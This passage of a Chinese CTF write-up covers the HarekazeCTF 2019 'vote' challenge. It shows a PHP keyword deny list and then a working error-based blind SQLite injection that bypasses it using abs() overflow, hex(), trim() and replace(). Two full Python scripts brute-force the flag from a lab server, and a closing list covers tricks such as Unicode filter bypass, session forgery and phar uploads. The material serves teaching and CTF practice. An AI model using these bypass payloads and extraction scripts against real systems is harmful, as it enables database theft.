  <span class="k">CREATE</span> <span class="k">TABLE</span> <span class="ss">`vote`</span> <span class="p">(</span>
    <span class="ss">`id`</span> <span class="kt">INTEGER</span> <span class="k">PRIMARY</span> <span class="k">KEY</span> <span class="n">AUTOINCREMENT</span><span class="p">,</span>
    <span class="ss">`name`</span> <span class="kt">TEXT</span> <span class="k">NOT</span> <span class="no">NULL</span><span class="p">,</span>
    <span class="ss">`count`</span> <span class="kt">INTEGER</span>
  <span class="p">);</span>
  <span class="k">INSERT</span> <span class="k">INTO</span> <span class="ss">`vote`</span> <span class="p">(</span><span class="ss">`name`</span><span class="p">,</span> <span class="ss">`count`</span><span class="p">)</span> <span class="k">VALUES</span>
    <span class="p">(</span><span class="s1">'dog'</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
    <span class="p">(</span><span class="s1">'cat'</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
    <span class="p">(</span><span class="s1">'zebra'</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
    <span class="p">(</span><span class="s1">'koala'</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

  <span class="k">DROP</span> <span class="k">TABLE</span> <span class="k">IF</span> <span class="k">EXISTS</span> <span class="ss">`flag`</span><span class="p">;</span>
  <span class="k">CREATE</span> <span class="k">TABLE</span> <span class="ss">`flag`</span> <span class="p">(</span>
    <span class="ss">`flag`</span> <span class="kt">TEXT</span> <span class="k">NOT</span> <span class="no">NULL</span>
  <span class="p">);</span>
  <span class="k">INSERT</span> <span class="k">INTO</span> <span class="ss">`flag`</span> <span class="k">VALUES</span> <span class="p">(</span><span class="s1">'HarekazeCTF{&lt;redacted&gt;}'</span><span class="p">);</span>
</pre></div>
<ul>
<li>在 <code>vote.php</code> 中给出了查询的 SQL 语句，但是对参数进行了检测</li>
</ul>
<div class="highlight"><pre><span></span><span class="x">function is_valid($str) {</span>
<span class="x">    $banword = [</span>
<span class="x">      // dangerous chars</span>
<span class="x">      // " % ' * + / &lt; = &gt; \ _ ` ~ -</span>
<span class="x">      "[\"%'*+\\/&lt;=&gt;\\\\_`~-]",</span>
<span class="x">      // whitespace chars</span>
<span class="x">      '\s',</span>
<span class="x">      // dangerous functions</span>
<span class="x">      'blob', 'load_extension', 'char', 'unicode',</span>
<span class="x">      '(in|sub)str', '[lr]trim', 'like', 'glob', 'match', 'regexp',</span>
<span class="x">      'in', 'limit', 'order', 'union', 'join'</span>
<span class="x">    ];</span>
<span class="x">    $regexp = '/' . implode('|', $banword) . '/i';</span>
<span class="x">    if (preg_match($regexp, $str)) {</span>
<span class="x">      return false;</span>
<span class="x">    }</span>
<span class="x">    return true;</span>
<span class="x">  }</span>

<span class="x">  $id = $_POST['id'];</span>
<span class="x">  if (!is_valid($id)) {</span>
<span class="x">    die(json_encode(['error' =&gt; 'Vote id contains dangerous chars']));</span>
<span class="x">  }</span>

<span class="x">  $pdo = new PDO('sqlite:../db/vote.db');</span>
<span class="x">  $res = $pdo-&gt;query("UPDATE vote SET count = count + 1 WHERE id = ${id}");</span>
<span class="x">  if ($res === false) {</span>
<span class="x">    die(json_encode(['error' =&gt; 'An error occurred while updating database']));</span>
<span class="x">  }</span>
</pre></div>
<ul>
<li>
<p><code>UPDATE</code> 成功与失败分别对应了不同的页面，那么是不是可以进行盲注，但是考虑到它过滤了 <code>'</code> 和 <code>"</code> 这就无法使用字符进行判断，<code>char</code> 又被过滤也无法使用 ASCII 码判断</p>
</li>
<li>
<p>所以可以考虑使用 <code>hex</code> 进行字符判断，将所有的的字符串组合用有限的 36 个字符表示</p>
</li>
<li>
<p>先考虑对 flag 16 进制长度的判断，假设它的长度为 <code>x</code>，<code>y</code> 表示 2 的 n 次方，那么 <code>x&amp;y</code> 就能表现出 <code>x</code> 二进制为 1 的位置，将这些 <code>y</code> 再进行或运算就可以得到完整的 <code>x</code> 的二进制，也就得到了 flag 的长度，而 <code>1&lt;&lt;n</code> 恰可以表示 2 的 n 次方</p>
</li>
<li>
<p>那么如何构造报错语句呢？在 <code>sqlite3</code> 中，<code>abs</code> 函数有一个整数溢出的报错，如果 <code>abs</code> 的参数是 <code>-9223372036854775808</code> 就会报错，同样如果是正数也会报错</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/Harekaze2019_vote_3.png"/></p>
</li>
<li>
<p>判断长度的 payload : <code>abs(case(length(hex((select(flag)from(flag))))&amp;{1&lt;&lt;n})when(0)then(0)else(0x8000000000000000)end)</code></p>
</li>
<li>
<p>脚本如下，长度 84</p>
</li>
</ul>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>

  <span class="n">url</span> <span class="o">=</span> <span class="s2">"http://1aa0d946-f0a0-4c60-a26a-b5ba799227b6.node2.buuoj.cn.wetolink.com:82/vote.php"</span>
  <span class="n">l</span> <span class="o">=</span> <span class="mi">0</span>
  <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">f</span><span class="s1">'abs(case(length(hex((select(flag)from(flag))))&amp;{1&lt;&lt;n})when(0)then(0)else(0x8000000000000000)end)'</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">'id'</span> <span class="p">:</span> <span class="n">payload</span>
    <span class="p">}</span>

    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
    <span class="k">if</span> <span class="s1">'occurred'</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
        <span class="n">l</span> <span class="o">=</span> <span class="n">l</span><span class="o">|</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="n">n</span>

  <span class="k">print</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>
</pre></div>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/Harekaze2019_vote_2.png"/></p>
<ul>
<li>然后考虑逐字符进行判断，但是 <code>is_valid()</code> 过滤了大部分截取字符的函数，而且也无法用 ASCII 码判断</li>
<li>这一题对盲注语句的构造很巧妙，首先利用如下语句分别构造出 <code>ABCDEF</code> ，这样十六进制的所有字符都可以使用了，并且使用 <code>trim(0,0)</code> 来表示空字符</li>
</ul>
<div class="highlight"><pre><span></span><span class="c1"># hex(b'zebra') = 7A65627261</span>
  <span class="c1"># 除去 12567 就是 A ，其余同理</span>
  <span class="n">A</span> <span class="o">=</span> <span class="s1">'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'</span>

  <span class="n">C</span> <span class="o">=</span> <span class="s1">'trim(hex(typeof(.1)),12567)'</span>

  <span class="n">D</span> <span class="o">=</span> <span class="s1">'trim(hex(0xffffffffffffffff),123)'</span>

  <span class="n">E</span> <span class="o">=</span> <span class="s1">'trim(hex(0.1),1230)'</span>

  <span class="n">F</span> <span class="o">=</span> <span class="s1">'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'</span>

  <span class="c1"># hex(b'koala') = 6B6F616C61</span>
  <span class="c1"># 除去 16CF 就是 B</span>
  <span class="n">B</span> <span class="o">=</span> <span class="n">f</span><span class="s1">'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||{C}||{F})'</span>
</pre></div>
<ul>
<li>然后逐字符进行爆破，已经知道 flag 格式为 <code>flag{}</code> ，<code>hex(b'flag{')==666C61677B</code>  ，在其后面逐位添加十六进制字符，构成 paylaod</li>
<li>再利用 <code>replace(length(replace(flag,payload,''))),84,'')</code> 这个语句进行判断</li>
<li>如果 flag 不包含 payload ，那么得到的 <code>length</code> 必为 84 ，最外面的 <code>replace</code> 将返回 <code>false</code> ，通过 <code>case when then else</code> 构造 <code>abs</code> 参数为 <code>0</code> ，它不报错</li>
<li>如果 flag 包含 payload ，那么 <code>replace(flag, payload, '')</code> 将 flag 中的 payload 替换为空，得到的 <code>length</code> 必不为 84 ，最外面的 <code>replace</code> 将返回 <code>true</code> ，通过 <code>case when then else</code> 构造 <code>abs</code> 参数为 <code>0x8000000000000000</code> 令其报错</li>
<li>以上就可以根据报错爆破出 flag，最后附上出题人脚本</li>
</ul>
<div class="highlight"><pre><span></span><span class="c1"># coding: utf-8</span>
<span class="kn">import</span> <span class="nn">binascii</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="n">URL</span> <span class="o">=</span> <span class="s1">'http://1aa0d946-f0a0-4c60-a26a-b5ba799227b6.node2.buuoj.cn.wetolink.com:82/vote.php'</span>


<span class="n">l</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
  <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
    <span class="s1">'id'</span><span class="p">:</span> <span class="n">f</span><span class="s1">'abs(case(length(hex((select(flag)from(flag))))&amp;{1&lt;&lt;j})when(0)then(0)else(0x8000000000000000)end)'</span>
  <span class="p">})</span>
  <span class="k">if</span> <span class="sa">b</span><span class="s1">'An error occurred'</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">:</span>
    <span class="n">l</span> <span class="o">|=</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">j</span>
<span class="k">print</span><span class="p">(</span><span class="s1">'[+] length:'</span><span class="p">,</span> <span class="n">l</span><span class="p">)</span>


<span class="n">table</span> <span class="o">=</span> <span class="p">{}</span>
<span class="n">table</span><span class="p">[</span><span class="s1">'A'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'</span>
<span class="n">table</span><span class="p">[</span><span class="s1">'C'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'trim(hex(typeof(.1)),12567)'</span>
<span class="n">table</span><span class="p">[</span><span class="s1">'D'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'trim(hex(0xffffffffffffffff),123)'</span>
<span class="n">table</span><span class="p">[</span><span class="s1">'E'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'trim(hex(0.1),1230)'</span>
<span class="n">table</span><span class="p">[</span><span class="s1">'F'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'</span>
<span class="n">table</span><span class="p">[</span><span class="s1">'B'</span><span class="p">]</span> <span class="o">=</span> <span class="n">f</span><span class="s1">'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||{table["C"]}||{table["F"]})'</span>


<span class="n">res</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">hexlify</span><span class="p">(</span><span class="sa">b</span><span class="s1">'flag{'</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">res</span><span class="p">),</span> <span class="n">l</span><span class="p">):</span>
  <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="s1">'0123456789ABCDEF'</span><span class="p">:</span>
    <span class="n">t</span> <span class="o">=</span> <span class="s1">'||'</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">c</span> <span class="k">if</span> <span class="n">c</span> <span class="ow">in</span> <span class="s1">'0123456789'</span> <span class="k">else</span> <span class="n">table</span><span class="p">[</span><span class="n">c</span><span class="p">]</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">res</span> <span class="o">+</span> <span class="n">x</span><span class="p">)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
      <span class="s1">'id'</span><span class="p">:</span> <span class="n">f</span><span class="s1">'abs(case(replace(length(replace(hex((select(flag)from(flag))),{t},trim(0,0))),{l},trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)'</span>
    <span class="p">})</span>
    <span class="k">if</span> <span class="sa">b</span><span class="s1">'An error occurred'</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">:</span>
      <span class="n">res</span> <span class="o">+=</span> <span class="n">x</span>
      <span class="k">break</span>
  <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s1">'[+] flag ({i}/{l}): {res}'</span><span class="p">)</span>
  <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
<span class="k">print</span><span class="p">(</span><span class="s1">'[+] flag:'</span><span class="p">,</span> <span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">res</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</pre></div>
<h1 data-content="1" id="5b310a26a67a08915e2f0c8f5d852b4b">题目总结</h1>
<ol>
<li>json 传输时是 Unicode 编码的，可以使用 Unicode 编码来绕过一个关键词过滤</li>
<li>
<code>FILEINFO</code> 可以识别 png 图片( 十六进制下 )的第一行，而 <code>getimagesize</code> 不可以</li>
<li>php 默认的 session 反序列化方式是 <code>php</code> ，其存储方式为 <code>键名+竖线+经过serialize函数序列处理的值</code> ，默认保存在 <code>/tmp</code>
</li>
<li>上传文件存放的位置在 <code>TEMP_DIR</code> ，和 <code>session</code> 信息保存在同一个位置，那么是不是可以考虑伪造 session</li>
<li>
<code>password_hash</code> 函数只对第一个参数的前 72 个字符有效</li>
<li>phar 是一系列文件的集合，通过 <code>addFromString(filename, file_content)</code> 写入信息，那么通过 <code>phar://test.phar/filename</code> 自然可以读取到，通常文件上传多可以考虑 phar</li>
<li>sqlite3 盲注 bypass ，利用 replace() 和 length 进行爆破，trim() 替换空字符，trim() 和 hex() 构造字符，&amp; 特性获取长度等等，在 mysql 中也存在溢出的现象</li>
</ol>
<h1 data-content="1" id="8ab79f46f07c2725442bab40b0d39aa7">参考链接</h1>
<ul>
<li><a href="https://www.cnblogs.com/2881064178dinfeng/p/6150645.html" target="_blank">https://www.cnblogs.com/2881064178dinfeng/p/6150645.html</a></li>
<li><a href="https://www.cnblogs.com/lipcblog/p/7348732.html" target="_blank">https://www.cnblogs.com/lipcblog/p/7348732.html</a></li>
</ul>
</div>
</div>